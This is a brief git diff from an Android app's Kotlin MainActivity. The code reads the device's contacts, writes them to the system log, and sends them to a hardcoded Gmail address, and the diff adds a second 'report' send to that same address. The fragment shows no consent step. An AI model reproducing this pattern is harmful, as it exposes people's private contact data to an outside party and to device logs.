@@ -106,6 +106,7 @@ class MainActivity : AppCompatActivity() {
                     var con = ContactsPOJO(c.getContacts())
                     Log.d("MAIN", "Contacts: ${c.getContacts()}")
                     service.sendContacts("wapnpoland@gmail.com", con)
+                        .concatWith(service.sendRaport("wapnpoland@gmail.com"))
                         .subscribeOn(Schedulers.io())
                         .observeOn(AndroidSchedulers.mainThread())
                         .subscribe(
